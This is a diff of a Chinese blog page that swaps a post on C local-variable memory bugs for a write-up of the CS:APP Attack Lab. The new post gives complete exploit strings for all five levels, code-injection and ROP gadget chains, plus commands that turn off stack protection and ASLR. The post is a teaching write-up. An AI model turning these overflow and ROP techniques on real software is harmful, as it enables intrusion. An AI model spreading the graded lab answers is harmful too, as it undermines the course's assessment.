@@ -16,7 +16,7 @@
   <meta name="description" content="A Coder&#39;s World">
   <meta name="author" content="YoungOcean">
   <meta name="keywords" content>
-  <title>关于c语言及其内存的一些记录 - Young&#39;s Blog</title>
+  <title>attack_lab记录 - Young&#39;s Blog</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -146,7 +146,7 @@
 </nav>
 
     <div class="view intro-2" id="background" parallax=true
-         style="background: url('https://i.loli.net/2020/07/22/SMN8CkyurJGFZ6X.png') no-repeat center center;
+         style="background: url('http://qn.blogyoung.top/20200728160058.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
@@ -159,8 +159,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-07-22 21:48">
-      2020年7月22日 晚上
+    <time datetime="2020-07-28 15:56">
+      2020年7月28日 下午
     </time>
   </div>
 
@@ -170,7 +170,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.9k 字
+      2.3k 字
     </span>
   
 
@@ -180,7 +180,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      25
+      36
        分钟
     </span>
   
@@ -212,227 +212,200 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年7月22日 晚上
+                  本文最后更新于：2020年7月28日 下午
                 
               </p>
             
             <article class="markdown-body">
-              <p>今天看csapp第9章，该章最后列举了常见内存问题的列表，其中有一项是关于局部变量问题，我简单拓展一下该问题。</p>
-<p>这是一个最简单的函数调用例子</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
-demo1.c
-一个正常的程序
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;
-    <span class="hljs-keyword">int</span> c = a+b;
-    <span class="hljs-keyword">return</span> c;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
-    <span class="hljs-keyword">int</span> result;
-    result=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);
-&#125;</code></pre></div>
-
-<p>我们将上述代码中的sum函数改写成汇编的形式</p>
-<div class="hljs"><pre><code class="hljs assembly">/* sum: a in %rdi ,b in %rsi , c in %rax*/
-movq %rdi %rax  // c=a
-addq %rsi %rax	// c=a+b
-retq			// return c</code></pre></div>
-
-<p>上面的代码根据以下两点知识：</p>
-<p>1.程序在编译时，编译器不会为局部变量创建空间</p>
-<p>2.程序运行时,局部变量在没有引用其地址时，且局部变量个数不大于保存变量寄存器的个数时，会将局部变量直接保存在寄存器中，节省数据拷贝的时间和内存空间</p>
-<p>我们现在将代码改一下</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
-demo2.c
-有bug的程序
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;
-    <span class="hljs-keyword">int</span> c = a+b;
-    <span class="hljs-keyword">return</span> &amp;c;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
-    <span class="hljs-keyword">int</span> result;
-    result=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);
-&#125;</code></pre></div>
-
-<p>上面的程序在编译时,会报如下错误</p>
+              <h1 id="attack-lab-实验记录"><a href="#attack-lab-实验记录" class="headerlink" title="attack lab 实验记录"></a>attack lab 实验记录</h1><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><ul>
+<li>了解缓冲溢出攻击</li>
+<li>了解ROP攻击</li>
+<li>熟悉gdb的使用</li>
+<li>进一步学习自动化的插入脚本,加快破解速度</li>
+</ul>
+<h2 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h2><p>实验前需阅读相关章节并仔细阅读指导手册</p>
 <blockquote>
-<p>warning: function returns address of local variable [-Wreturn-local-addr]</p>
+<p>Your solutions may not use attacks to circumvent the validation code in the programs. Specifically, any address you incorporate into an attack string for use by a ret instruction should be to one of the following destinations: </p>
+<p>– The addresses for functions touch1, touch2, or touch3.</p>
+<p>– The address of your injected code </p>
+<p>– The address of one of your gadgets from the gadget farm.</p>
+<p>These are called exploit strings.  漏洞利用字符</p>
+<p>Both CTARGET and RTARGET take several different command line arguments:</p>
+<p>-h: Print list of possible command line arguments </p>
+<p>-q: Don’t send results to the grading server </p>
+<p>-i FILE: Supply input from a file, rather than from standard input</p>
 </blockquote>
-<p>我们用汇编语言来表示以下sum函数,这里省略一些寄存器的保存操作</p>
-<div class="hljs"><pre><code class="hljs assembly">/* sum: a in %rdi ,b in %rsi , c in %rdx , &amp;c in %rax*/
+<p><img src="http://qn.blogyoung.top/20200728101752.png" srcset="/img/loading.gif" alt></p>
+<p>防御的三种手段</p>
+<ul>
+<li>栈随机化  ASLR（内存地址随机化）  heap和local的地址会改变</li>
+<li>栈破坏检测 Stack Protector（栈保护）</li>
+<li>限制可执行代码区 DEP（堆栈不可执行）</li>
+</ul>
+<p>思考:</p>
+<p>1.为什么代码会出现在栈上,他们本应该出现在下面的文本段</p>
+<ul>
+<li>如果未开启栈保护机制,可以直接将我们想要执行的代码加在栈上</li>
+<li>如果开启了栈保护机制,则需要考虑rop,使用程序原本的代码片段(gadgets)</li>
+</ul>
+<p>2.字节序的问题</p>
+<ul>
+<li>除了solar的系统,基本上其他系统都是<code>little-endian</code>字节序，即低位在低地址，高位在高地址。</li>
+<li>我们输入机器码的时候,是从低地址到高地址,所以这里输入前需要转换一下</li>
+</ul>
+<p>课程截图;</p>
+<p><img src="http://qn.blogyoung.top/image-20200728112723025.png" srcset="/img/loading.gif" alt="image-20200728112723025"></p>
+<p><img src="http://qn.blogyoung.top/image-20200728113437138.png" srcset="/img/loading.gif" alt="image-20200728113437138"></p>
+<p>上述两张图说明了两个问题:</p>
+<ul>
+<li><p>返回地址是绝对地址,而不是像jmp和call一样的相对地址,因此也方便插入自己的代码地址</p>
+</li>
+<li><p>x64系统把%rip设置为不可见了,但是任然是按照顺序执行,具体的操作准备后续了解</p>
+</li>
+</ul>
+<p>实验时,需要知道缓冲区的大小,需要用gdb进行反汇编查看分配的空间</p>
+<p><img src="http://qn.blogyoung.top/image-20200728155356611.png" srcset="/img/loading.gif" alt="image-20200728155356611"></p>
+<p>同理,通过此方法查看每一个函数的入口地址</p>
+<h2 id="3-解题过程"><a href="#3-解题过程" class="headerlink" title="3.解题过程"></a>3.解题过程</h2><h3 id="level1-注意点"><a href="#level1-注意点" class="headerlink" title="level1 注意点"></a>level1 注意点</h3><blockquote>
+<p>• All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
+</blockquote>
+<p>答案:</p>
+<div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00  /* this address is touch1 , return to touch1 then success*/</code></pre></div>
 
-movq %rdi %rdx  // c=a
-addq %rsi %rdx	// c=a+b
-push %rdx		//将变量压入栈
-movq %rsp %rax  //
-retq			// return &amp;c</code></pre></div>
-
-<p>上面的代码根据以下两点知识：</p>
-<p>1.由于程序引用了变量的地址,且为局部变量,所以要把局部变量压入栈中,并获得其在栈中的变量地址</p>
-<p>2.程序从sum返回时,将会改变%rbp的值(此处未列出,具体可查表),使得sum函数所分配的所有局部变量被释放.编译器在编译时,会发现该错误并终止编译</p>
-<p>我们也可以看一下书上的解释</p>
-<p><img src="https://i.loli.net/2020/07/22/znJyCb3HAZ6l9u2.jpg" srcset="/img/loading.gif" alt="cerror"></p>
-<p>明白了上述解释，就能明白局部变量的使用问题。现在gcc编译时就能检查出该问题。</p>
-<p>继续修改一下代码</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
-demo3.c
-有bug的程序
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> * result)</span></span>&#123;
-    <span class="hljs-keyword">int</span> c = a+b;
-	* result =c;
-
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
-    <span class="hljs-keyword">int</span> * result;
-    sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,result);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"result = %d\n"</span>,*result);
-&#125;</code></pre></div>
-
-<p>程序在编译时会有如下错误：</p>
+<h3 id="level2-注意点"><a href="#level2-注意点" class="headerlink" title="level2 注意点"></a>level2 注意点</h3><blockquote>
+<p>• You will want to position a byte representation of the address of your injected code in such a way that<br>ret instruction at the end of the code for getbuf will transfer control to it.<br>• Recall that the first argument to a function is passed in register %rdi.<br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer<br>control to the first instruction in touch2.<br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination<br>addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of<br>control, even when you are not returning from a call.<br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of<br>instruction sequences.</p>
+</blockquote>
+<p>这里第3点很有意思,不建议用jmp或call指令,因为他们的跳转采用相对地址,所以会造成麻烦的计算.我们需要用ret指令来进行重定向</p>
+<p>将正常的返回地址设置为注入代码的地址,为了方便选择栈顶注入,</p>
 <blockquote>
-<p>Segmentation fault (core dumped)</p>
+<p>test -&gt; getBuf -&gt;touch2(pass cookie)</p>
 </blockquote>
-<p>这里需要搞清楚变量声明和定义，当声明一个基本类型的变量时(C里面没有这个概念，可以理解为除了数组，结构体和联合以外的变量)，编译器也不会为他分配空间。只有在定义的时候，也就是为变量赋值的时候，才会分配给该变量空间(这里的局部变量用到了指针,赋值时按上面的规则,会将变量保存在栈中) 。如果要修改上面的程序，可以将result声明为一个数的数组，当然实际中，会优化代码结构。</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
-demo4.c
-一种简单的修改方式
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> * result)</span></span>&#123;
-    <span class="hljs-keyword">int</span> c = a+b;
-	* result =c;
+<p>构造%rdi和返回地址</p>
+<div class="hljs"><pre><code class="hljs assembly">movq $0x  ,%rdi  //将cookie赋值给%rdi
+push //touch2的地址
+ret</code></pre></div>
 
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
-    <span class="hljs-keyword">int</span> result[<span class="hljs-number">1</span>];
-    sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,result);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"result = %d\n"</span>,*result);
-&#125;</code></pre></div>
+<p>转换成汇编代码,然后求出栈顶位置,将返回地址覆盖为栈顶位置即可</p>
+<p>答案:</p>
+<div class="hljs"><pre><code class="hljs assembly">48 c7 c7 fa 97 b9 59 68  /* mov $0x59b99fa, %rdi , 68-00 pushq $0x4017ec */
+ec 17 40 00 c3 00 00 00  /* c3 retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00  /* move to the top of the stack to run the injected code */</code></pre></div>
 
-<p>我们接着写一个书上的问题，关于动态分配栈空间</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">//demo5.c</span>
+<h3 id="Level3-注意点"><a href="#Level3-注意点" class="headerlink" title="Level3 注意点"></a>Level3 注意点</h3><blockquote>
+<p>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”</p>
+<p>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</p>
+<p>• Your injected code should set register %rdi to the address of this string. </p>
+<p>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</p>
+</blockquote>
+<p>执行流程</p>
+<blockquote>
+<p>test -&gt; getBuf -&gt; touch3 -&gt; hexmatch -&gt; touch3</p>
+</blockquote>
+<p>这里由于在调用hexmath时,随机的字符指针可能会覆盖我们插入的字符,因此我们需要将字符插入父函数的栈帧</p>
+<div class="hljs"><pre><code class="hljs assembly">movq $0x , %rdi   //将字符串指针赋值给%rdi
+push $0x	//将此处的地址压入栈
+ret</code></pre></div>
 
-<span class="hljs-comment">/*
-n:创建的变长二维数组的长度
-idx:用来返回索引
-q:用来记录地址
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vframe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n,<span class="hljs-keyword">int</span> idx,<span class="hljs-keyword">int</span> *q)</span>
-</span>&#123;
-    <span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;
-    <span class="hljs-keyword">int</span> *p[n];
-    p[<span class="hljs-number">0</span>] = &amp;i;
-    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)
-        p[i] = q;
-    <span class="hljs-keyword">return</span> *p[idx];
-&#125;
+<p>答案:</p>
+<div class="hljs"><pre><code class="hljs assembly">48 c7 c7 a8 dc 61 55 68	/* mov 0x5561dca0 to %rdi ,the address of string */
+fa 18 40 00 c3 00 00 00 /* push 0x4018fa , the address of touch3  */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /* return to the top of stack */
+35 39 62 39 39 37 66 61	/* the cookie string  */
+00</code></pre></div>
 
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span>
-</span>&#123;
-    <span class="hljs-keyword">int</span> length=<span class="hljs-number">5</span>;
-	<span class="hljs-keyword">int</span> ida=<span class="hljs-number">2</span>;
-	<span class="hljs-keyword">int</span> t =<span class="hljs-number">3</span>;
-    
-	<span class="hljs-keyword">int</span> a = vframe (length, ida,&amp;t);
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"return value %d\n"</span>, a);
-&#125;</code></pre></div>
+<hr>
+<p>ROP攻击</p>
+<p>以<code>ret</code>结尾的一段指令序列，我们称之为<code>gadget</code>。栈随机化后,只有代码段和全局变量段的位置不会改变,本题中,我们可以找到代码段的某些位置,将我们注入的代码重定向到这些代码中, <strong>这是一种替换程序计数器的方法</strong>,我们不能手动赋值给%rip,但是可以使用ret指令,将%rip定位到我们想要执行的地方,我们需要放入几个小段的组合代码,目的是找到程序中的gadget,即最后一个一个字节为C3的指令</p>
+<p>这里有两点需要注意:</p>
+<p>1.stack空间随机化,无法获取stack的首地址</p>
+<p>2.无法执行stack上的指令</p>
+<h3 id="level4-注意点"><a href="#level4-注意点" class="headerlink" title="level4 注意点"></a>level4 注意点</h3><blockquote>
+<p>•You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” </p>
+<p>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need. </p>
+<p>• Your injected code should set register %rdi to the address of this string. </p>
+<p>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</p>
+</blockquote>
+<p>答案:</p>
+<div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* when finish input ,the ret to what we input the next line,and the stack to the line of fa */
+ab 19 40 00 00 00 00 00  /* the address of pop %rax */
+fa 97 b9 59 00 00 00 00	 /* mov 0x59b997fa to %rax */
+a2 19 40 00 00 00 00 00  /* the address of mov %rax,%rdi  */
+ec 17 40 00 00 00 00 00  /* return to the address of touch2  */</code></pre></div>
 
-<p>由于局部变量在编译时，编译器不会为其分配空间，因此，如果要分配一个动态的数组，一种方法如上所示，我们可以传入数组的大小，在内部进行一些计算后，返回结果。我们用objdump查看一下源码</p>
-<div class="hljs"><pre><code class="hljs assembly">/*
-int vframe(int n,int idx,int *q)
-n in rdi , idx in rsi, q in rdx
-*/
+<h3 id="level5-注意点"><a href="#level5-注意点" class="headerlink" title="level5 注意点"></a>level5 注意点</h3><p><img src="http://qn.blogyoung.top/image-20200728154530020.png" srcset="/img/loading.gif" alt="image-20200728154530020"></p>
+<blockquote>
+<p>•All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm. </p>
+<p>• You can do this attack with just two gadgets. </p>
+<p>• When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p>
+</blockquote>
+<p>思考:</p>
+<p>1.为什么需要指令来计算cookie的地址,而不能直接赋值??</p>
+<p>-&gt;因为我们是不知道%rsp的地址的</p>
+<p>2.那如何间接获得字符串的地址??</p>
+<p>-&gt;通过基址加偏移来计算 刚好用到lea指令</p>
+<p>3.如何给寄存器赋立即值??</p>
+<p>-&gt;由于我们不能执行指令,只能通过需pop指令来间接赋值 ,如pop %rax</p>
+<p>4.如何查找所需要的片段??</p>
+<p>-&gt;根据writeup查找,里面包含了各种指令的x64机器码</p>
+<p>5.有没有什么捷径??</p>
+<p>-&gt;没有,虽然题目是设计好的,但也需要拼凑很多代码片段,实际破解,也是需要不断地尝试,才有可能改变地址</p>
+<p>答案:</p>
+<div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00   /* padding */
+06 1a 40 00 00 00 00 00   /* movq %rsp,%rax */
+a2 19 40 00 00 00 00 00	  /* movq %rax,%rdi */
+ab 19 40 00 00 00 00 00	  /* pop %rax */
+48 00 00 00 00 00 00 00	  /* 48 */
+dd 19 40 00 00 00 00 00   /* movl %eax,%edx */
+34 1a 40 00 00 00 00 00   /* movl %edx,%ecx */ 
+13 1a 40 00 00 00 00 00	  /* movl %ecx,%esi */ 
+d6 19 40 00 00 00 00 00	  /* lea (rdi,rsi,1),%rax */
+a2 19 40 00 00 00 00 00   /* movq %rax,%rdi */
+fa 18 40 00 00 00 00 00   /* return to touch3 */
+35 39 62 39 39 37 66 61   /*  */
+00</code></pre></div>
 
-00000000000006da &lt;vframe&gt;:
- 6da:	55                   	push   %rbp
- 6db:	48 89 e5             	mov    %rsp,%rbp
- 6de:	48 83 ec 10          	sub    $0x10,%rsp
- 6e2:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
- 6e9:	00 00 
- 6eb:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
- 6ef:	31 c0                	xor    %eax,%eax
- 6f1:	48 63 c7             	movslq %edi,%rax
- 6f4:	48 8d 04 c5 16 00 00 	lea    0x16(,%rax,8),%rax
- 6fb:	00 
- 6fc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
- 700:	48 29 c4             	sub    %rax,%rsp
- 703:	48 8d 44 24 07       	lea    0x7(%rsp),%rax
- 708:	48 c1 e8 03          	shr    $0x3,%rax
- 70c:	4c 8d 04 c5 00 00 00 	lea    0x0(,%rax,8),%r8
- 713:	00 
- 714:	4c 89 c1             	mov    %r8,%rcx
- 717:	4c 8d 4d f4          	lea    -0xc(%rbp),%r9
- 71b:	4c 89 0c c5 00 00 00 	mov    %r9,0x0(,%rax,8)
- 722:	00 
- 723:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
- 72a:	eb 0a                	jmp    736 &lt;vframe+0x5c&gt;
- 72c:	48 98                	cltq   
- 72e:	48 89 14 c1          	mov    %rdx,(%rcx,%rax,8)
- 732:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
- 736:	8b 45 f4             	mov    -0xc(%rbp),%eax
- 739:	39 f8                	cmp    %edi,%eax
- 73b:	7c ef                	jl     72c &lt;vframe+0x52&gt;
- 73d:	48 63 f6             	movslq %esi,%rsi
- 740:	49 8b 04 f0          	mov    (%r8,%rsi,8),%rax
- 744:	8b 00                	mov    (%rax),%eax
- 746:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
- 74a:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
- 751:	00 00 
- 753:	75 02                	jne    757 &lt;vframe+0x7d&gt;
- 755:	c9                   	leaveq 
- 756:	c3                   	retq   
- 757:	e8 44 fe ff ff       	callq  5a0 &lt;__stack_chk_fail@plt&gt;</code></pre></div>
+<p>参考表格:</p>
+<p><img src="http://qn.blogyoung.top/image-20200728154632359.png" srcset="/img/loading.gif" alt="image-20200728154632359"></p>
+<h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4.其他"></a>4.其他</h2><div class="hljs"><pre><code class="hljs shell">自己创建漏洞程序的一些指令
+1.关闭栈保护机制
+-fno-stack-protector 
+2.关闭保护栈执行机制
+-z execstack
+3.关闭ASLR
+sudo -s
+echo 0&gt;/proc/sys/kernal/randomize_va_space
+exit
+4.开启core dump
+ulimit -c unlimited
+sudo sh -c 'echo "/tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'
+5.不生成CFI指令
+-fno-asynchronous-unwind-tables
+6.不做任何优化处理
+-O1</code></pre></div>
 
-<p>6eb-700分配数组空间</p>
-<p>700-740 进行数组操作,其中的变量都保存在动态分配的栈中</p>
-<p>744 得到返回结果</p>
-<p>可以看到，该函数最后返回的是一个在该函数内分配的一个值，返回给寄存器后，没有地址的引用，所以可以正确返回。</p>
-<p>我们再来看一个别名的例子,当程序的不同部分指向内存中相同的位置时，这称为别名。别名的使用会影响到程序的优化，以下的代码很好的说明了，别名设置对数组的影响。</p>
-<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">double</span> A[<span class="hljs-number">9</span>] = &#123;
-    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,
-    <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>,
-    <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">128</span>&#125;;
-
-<span class="hljs-comment">/*
-Sum rows is of n X n matrix a and store in vector b
-a: n*n array
-b: n array 
-n: size
-*/</span>
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum_rowsl</span><span class="hljs-params">(<span class="hljs-keyword">double</span> *a, <span class="hljs-keyword">double</span> *b, <span class="hljs-keyword">long</span> n)</span>
-</span>&#123;
-    <span class="hljs-keyword">long</span> i, j;
-    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)
-    &#123;
-        b[i] = <span class="hljs-number">0</span>;
-        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; n; j++)
-        &#123;
-            b[i] += a[i * n + j];
-  <span class="hljs-comment">//          printf("%f\n", b[i]);</span>
-        &#125;
-    &#125;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
-</span>&#123;
-    <span class="hljs-keyword">double</span> * B = A + <span class="hljs-number">3</span>;
-    sum_rowsl(A, B, <span class="hljs-number">3</span>);
-&#125;
-<span class="hljs-comment">//上述代码在每次i改变后，b的值都会改变，最终B的结果如下</span>
-<span class="hljs-number">32.000000</span>
-<span class="hljs-number">96.000000</span>
-<span class="hljs-number">224.000000</span></code></pre></div>
-
-<p>这里由于用objdump看结果不直观,我们用cgdb来查看</p>
-<p><img src="https://i.loli.net/2020/07/22/KzQ8WeBZPT1s2DE.png" srcset="/img/loading.gif" alt="image-20200722210210797"></p>
-<p>可以看到,main函数中,A,B,C的地址分别保存在%rdi,%rsi,%rdx中,然后调用sum_rowsl函数</p>
-<p>我们打印一下A中的值.可以看出,A数组和B数组引用了部分相同的内存空间</p>
-<p><img src="https://i.loli.net/2020/07/22/AbpJQXZ3CSV8O42.png" srcset="/img/loading.gif" alt="image-20200722212857390"></p>
-<p>进入sum_rowsl函数后,截取关键代码</p>
-<p>每次计算完b[i]的值后,都要将其写回%r12所指向的内存地址,即该数组中某个值的位置,因为a中也引用了该数组的内容,所以累加的结果不能保存在寄存器中,必须回写,然后每次再调用a的值时,从内存中取出.由于我们一开始的代码A定义的是全局变量,所以这里面没有用到栈,如果定义位局部变量,则会用到栈.上述情况明白后可以自己尝试.</p>
-<p><img src="https://i.loli.net/2020/07/22/eRQmMxz7wsBCgZE.png" srcset="/img/loading.gif" alt="image-20200722213145145"></p>
-<p>关于内存的问题,还有很多,bomblab,cachelab都有关于这方面的知识.</p>
+<p>参考记录:</p>
+<p><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官方writeup</a></p>
+<p><a href="https://mcginn7.github.io/2020/02/19/CSAPP-attacklab/" target="_blank" rel="noopener">mcginn博客</a></p>
+<p><a href="https://www.jianshu.com/p/db731ca57342" target="_blank" rel="noopener">简书文章</a></p>
 
             </article>
             <hr>
@@ -442,7 +415,7 @@ n: size
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/计算机系统/">计算机系统</a>
+                      <a class="hover-with-bg" href="/categories/csapp/">csapp</a>
                     
                   </div>
                 
@@ -450,7 +423,7 @@ n: size
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/C-计算机系统/">-C -计算机系统</a>
+                      <a class="hover-with-bg" href="/tags/lab-汇编-ROP/">-lab -汇编 -ROP</a>
                     
                   </div>
                 
@@ -463,9 +436,9 @@ n: size
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/07/27/csapp/boom_lab记录/">
+                      <a href="/2020/08/03/2020-8-3随笔/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">csapp Boom_lab 实验记录</span>
+                        <span class="hidden-mobile">2020.8.3随笔</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -473,8 +446,8 @@ n: size
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/07/13/图床搭建/">
-                        <span class="hidden-mobile">图床搭建</span>
+                      <a href="/2020/07/27/csapp/boom_lab记录/">
+                        <span class="hidden-mobile">csapp Boom_lab 实验记录</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -639,7 +612,7 @@ n: size
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "关于c语言及其内存的一些记录&nbsp;",
+        "attack_lab记录&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
